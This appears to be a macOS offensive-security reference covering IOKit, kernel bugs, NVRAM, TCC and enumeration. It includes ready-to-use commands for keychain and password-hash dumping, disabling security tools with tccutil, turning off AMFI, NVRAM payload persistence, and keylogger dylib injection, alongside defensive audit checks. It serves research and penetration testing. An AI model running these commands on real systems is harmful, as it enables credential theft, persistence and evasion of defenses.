# IOKit, Kernel Attacks & Enumeration Reference

## IOKit Framework

IOKit is XNU's object-oriented device-driver framework. Drivers (C++) export functions callable from user space via Mach messages. Demangle: `nm -C` or `c++filt`.

Locations: `/System/Library/Extensions` (Apple), `/Library/Extensions` (third-party).

**IORegistry** -- hierarchical hardware/driver database. Planes: IOService, IODeviceTree, IOPower, IOUSB, IOAudio.

```bash
ioreg -l; ioreg -w 0; ioreg -p IODeviceTree     # registry inspection
kextstat                                          # loaded drivers
kextfind -bundle-id -substring IOR                # search kexts
```

### User-Space Communication

```c
CFMutableDictionaryRef d = IOServiceMatching("TargetService");
io_iterator_t iter; io_service_t svc; io_connect_t conn;
IOServiceGetMatchingServices(kIOMasterPortDefault, d, &iter);
svc = IOIteratorNext(iter);
IOServiceOpen(svc, mach_task_self(), 0, &conn);
IOConnectCallScalarMethod(conn, 0, NULL, 0, NULL, NULL);  // selector 0
// Also: IOConnectCallMethod, IOConnectCallStructMethod
IOServiceClose(conn);
```

### Reversing externalMethod

Driver entrypoint dispatches through `IOExternalMethodDispatch2022` array:
```cpp
IOUserClient2022::dispatchExternalMethod(uint32_t selector,
    IOExternalMethodArgumentsOpaque *args,
    const IOExternalMethodDispatch2022 dispatchArray[], size_t count,
    OSObject *target, void *reference)
```
In Ghidra/IDA: retype `sIOExternalMethodArray` to `IOExternalMethodDispatch2022[N]` -- reveals all selectors and handler pointers. Selector numbers = array indices. Struct def: `xnu/.../IOUserClient.h#L168-L176`.

### DriverKit (User-Space Drivers)

`.dext` bundles: user-space processes with direct kernel IOKit channel. Installed via `SystemExtensions.framework`.

```bash
systemextensionsctl list
find / -name "*.dext" -type d 2>/dev/null
codesign -d --entitlements - /path/to/binary.dext/binary 2>&1 | grep driverkit
```

Entitlements: `.transport.usb`, `.hid`, `.pci`, `.serial`, `.family.networking`, `.family.audio`.
Attack surface: IOKit message fuzzing, USB HID spoofing, PCIe/Thunderbolt DMA, persistence.

---

## IOKit Vulnerability Research

| CVE | Target | Impact |
|-----|--------|--------|
| CVE-2024-27799 | IOHIDFamily | HID user client grabs events past secure input |
| CVE-2024-44197 | IOGPUFamily | OOB write from sandbox via malformed struct args |
| CVE-2025-24257 | IOGPUFamily | OOB write via variable-length GPU data |
| CVE-2023-42891 | IOHIDFamily | Sandbox-escape via HID user clients |
| CVE-2022-26766 | DriverKit USB | Kernel code exec via USB stack |
| CVE-2021-30838 | IOKit graphics | User-client type confusion |

**Fuzzing approach:**
```bash
ioreg -l | grep -i "UserClientClass" | sort -u       # enumerate user clients
strings /System/Library/Extensions/IOHIDFamily.kext/Contents/MacOS/IOHIDFamily | \
  grep -E "^com\.apple\.(driver|private)"             # check entitlement reachability
```

Common bug: inconsistent `structureInputSize`/`structureOutputSize` vs `copyin` length. Minimal harness:
```c
uint8_t buf[0x2000]; memset(buf, 'A', sizeof(buf)); size_t outSz = sizeof(buf);
IOConnectCallStructMethod(conn, SELECTOR, buf, sizeof(buf), buf, &outSz);
```

---

## System Extensions & Endpoint Security

Types: **DriverKit** (hardware), **Network** (VPN/filter/DNS proxy), **Endpoint Security** (monitoring).

ESF kernel component: `/System/Library/Extensions/EndpointSecurity.kext`. Components: Driver (entry point), EventManager (kernel hooks), ClientManager (user-space tracking), MessageManager (event dispatch).

User-space clients: `EndpointSecurityDriverClient` (`com.apple.private.endpoint-security.manager`, only `endpointsecurityd`) and `EndpointSecurityExternalClient` (`com.apple.developer.endpoint-security.client`, third-party tools). Library: `libEndpointSecurity.dylib`.

**Bypassing ESF -- CVE-2021-30965:** security apps need FDA; stripping it kills them:
```bash
tccutil reset All
```
Fixed via `kTCCServiceEndpointSecurityClient` (immune to `tccutil`).

---

## NVRAM Attacks

```bash
nvram -p                                              # list all
nvram csr-active-config; csrutil status               # SIP state
sudo nvram boot-args="debug=0x144 kcsuffix=development"
sudo nvram -d boot-args                               # delete
```

### SIP Bitmask (csr-active-config)

| Bit | Hex | Protection | Bit | Hex | Protection |
|-----|-----|------------|-----|-----|------------|
| 0 | 0x01 | Filesystem | 4 | 0x10 | Apple Internal |
| 1 | 0x02 | Kext signing | 5 | 0x20 | Unrestricted DTrace |
| 2 | 0x04 | Task-for-pid | 6 | 0x40 | Unrestricted NVRAM |
| 3 | 0x08 | Unrestricted FS | 7 | 0x80 | Device config |

Intel/reduced-security: `nvram csr-active-config=%7f%00%00%00`. Apple Silicon: changes only via recoveryOS.

**AMFI bypass:** `sudo nvram boot-args="amfi_get_out_of_my_way=1"` (requires reduced security).
**Debug flags:** `0x01`=HALT `0x04`=KPRT `0x40`=KERN_DUMP `0x100`=REBOOT_POST_PANIC.

**Firmware persistence:** NVRAM survives OS reinstall/disk wipe. Clear via PRAM reset (Intel) or DFU (AS).
```bash
nvram attacker-config="payload_b64"
# Boot script: nvram attacker-config 2>/dev/null && /path/to/payload
```

| CVE | Description |
|-----|-------------|
| CVE-2020-9839 | Persistent SIP bypass via NVRAM |
| CVE-2019-8779 | Firmware NVRAM persistence on T2 |
| CVE-2022-22583 | PackageKit NVRAM privesc |

```bash
# Audit: hunt non-Apple NVRAM vars (persistence indicators)
nvram -p | grep -vE "^(SystemAudioVolume|boot-args|csr-active-config|prev-lang|bluetooth|efi-)" | head -20
```

---

## Coprocessors

| Coprocessor | Comm Channel | Attack Surface | Impact |
|-------------|-------------|----------------|--------|
| **SEP** | Mailbox (EL1) | Firmware updates, `seputil`/`securityd` | Leak keys, bypass biometrics, break FileVault |
| **T1/T2** | PCIe/USB IOKit | DFU/restore, IPC, media pipelines | Disable secure boot, decrypt SSD, hijack cam/mic |
| **SMC** | IOKit user clients | USB-C PD, fan/battery, firmware update | Sensor injection, NVRAM backdoors |
| **DCP** | `DCPAVService` | Descriptor buffers, firmware parsing | Snoop/inject framebuffers |
| **ANE** | `ANECompilerService` | `.ane` models, Core ML, firmware loaders | Exfiltrate ML models/data |
| **AGX GPU** | Metal + AGXFirmware ioctls | Shader compiler, buffer mapping | DMA, sandbox escape |
| **ISP** | Camera HALs | Frame descriptors, ISP config | Silent camera capture |

All firmware Apple-signed with challenge-response handshake.

---

## Kernel Vulnerability Classes

**MIG type-confusion (CVE-2023-41075):** Malformed `mach_msg()` to IOKit user client -- MIG glue reinterprets reply with larger OOL descriptor, OOB write into kernel heap. Weaponize: spray `ipc_kmsg` with port pointers, overwrite `ip_kobject`, PAC-forged jump.

**In-the-wild 0-days (2024):**
- CVE-2024-23225: XNU VM OOB write via crafted XPC -- arbitrary kernel R/W bypassing PAC/KTRR
- CVE-2024-23296: RTKit memory corruption -- chains with above to disable PAC. Patched 14.4+.

**SIP bypass (CVE-2024-44243 "Sigma"):** `storagekitd` loads unsigned kext before SIP validation. Fix: macOS 15.2+.
```bash
kmutil showloaded | grep -v com.apple   # detect rogue kexts
```

**OTA exploitation:** kernel compromise via software updater (CVE-2022-46722).

```bash
uname -a; kmutil showloaded; sysctl kern.kaslr_enable; csrutil status; spctl --status
```
Tools: Luftrauser (MIG fuzzer), oob-executor (IPC OOB), `kmutil inspect -b <bundleID>`.

---

## Authorization Database

DB: `/var/db/auth.db` (seeded from `/System/Library/Security/authorization.plist`).
Rule classes: `allow`, `deny`, `user` (group), `rule` (delegate), `evaluate-mechanisms` (SecurityAgentPlugins from `/System/Library/CoreServices/SecurityAgentPlugins/` or `/Library/Security/SecurityAgentPlugins/`).

```bash
sudo sqlite3 /var/db/auth.db "SELECT name, comment FROM rules"
security authorizationdb read com.apple.tcc.util.admin
security execute-with-privileges /bin/ls    # triggers security_authtrampoline
```
`authd` daemon: XPC service, logs to `/var/log/authd.log`.

---

## Enumeration & Forensics

```bash
sw_vers; uname -a; whoami; id
system_profiler SPSoftwareDataType SPHardwareDataType SPApplicationsDataType SPUSBDataType
launchctl list; launchctl print system; launchctl print gui/$(id -u)
sysctl -a; diskutil list; lsof -i -P -n | grep LISTEN; arp -i en0 -l -a
```

**Anti-VM:** `system_profiler SPHardwareDataType | grep -Eiq 'qemu|kvm|vmware|virtualbox'`

### Credential Harvesting Locations

```bash
# Shadow hashes (hashcat -m 7100 PBKDF2-SHA512)
for l in /var/db/dslocal/nodes/Default/users/*; do [ -r "$l" ] && defaults read "$l"; done
sudo dscl . -read /Users/$(whoami) ShadowHashData
# Keychain
security dump-keychain -d; security find-generic-password -s "Wi-Fi" -w
# Auto-login: /etc/kcpassword (XOR key: 7D 89 52 23 D2 BC DD EA A3 B9 1F)
# CVE-2025-24204 (15.0-15.2): gcore dumps securityd -> keychain master key. Fixed 15.3+.
```

**Databases:** `~/Library/Messages/chat.db`, `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`, `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db` (CVE-2024-44292: world-readable on 14.7-15.1).

### Memory Dumping

- Swap: `/private/var/vm/swapfile0..N` (check `sysctl vm.swapusage`)
- Hibernate: `/private/var/vm/sleepimage` (encrypted on modern systems)
- Full RAM (legacy Intel): `sudo osxpmem.app/osxpmem --format raw -o /tmp/dump`
- Process dump (modern): `sudo lldb --attach-pid PID` then `process save-core /tmp/out.core --style full`
- Selective (Frida): enumerate `rw-` ranges, dump anonymous regions for secrets/tokens

### Installer Abuse

pkg pre/post scripts run as root. Vectors: race on scripts in `/var/tmp/`, `AuthorizationExecuteWithPrivileges` path hijack, mount over `/tmp/fixedname` with `noowners` (CVE-2021-26089), empty-payload pkg with malicious scripts, JS in `dist.xml` via `system.run()`.
```bash
pkgutil --expand /path/to/package.pkg /tmp/out; cat /tmp/out/Scripts | gzip -dc | cpio -i
```

---

## TCC Credential Theft

Code injection into TCC-granted binary silently inherits all permissions.

**Input Monitoring** (`kTCCServiceListenEvent`): `CGEventTap` intercepts all keystrokes/mouse system-wide. Inject dylib into app with ListenEvent + disabled library validation: `DYLD_INSERT_LIBRARIES=/tmp/kl.dylib /path/to/app`.

**Input Injection** (`kTCCServicePostEvent`): `CGEventPost` injects keystrokes/clicks -- auto-approve TCC dialogs.

**Screen Capture** (`kTCCServiceScreenCapture`): `CGWindowListCreateImage`, `ScreenCaptureKit` (12.3+). Sonoma adds persistent indicator.

**Accessibility** (`kTCCServiceAccessibility`): AXUIElement API reads/controls any app UI. Self-grant more TCC by navigating System Settings. Scrape password managers via osascript.

**Chains:** ListenEvent+ScreenCapture = full credential capture. Accessibility+PostEvent = remote control. Accessibility alone = self-grant Camera/Mic/FDA.

```bash
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture \
           kTCCServiceAccessibility kTCCServiceSystemPolicyAllFiles; do
  echo "=== $svc ==="
  sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client,auth_value FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
  sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client,auth_value FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
```

| Priority | Permission | Reason |
|----------|-----------|--------|
| Critical | Full Disk Access / TCC Manager | Read everything / grant any perm |
| High | Keychain Groups / iCloud Account | All passwords / multi-device |
| High | ListenEvent / Accessibility | Keylogging / GUI control + self-grant |
| Medium | ScreenCapture / Camera+Mic | Surveillance |
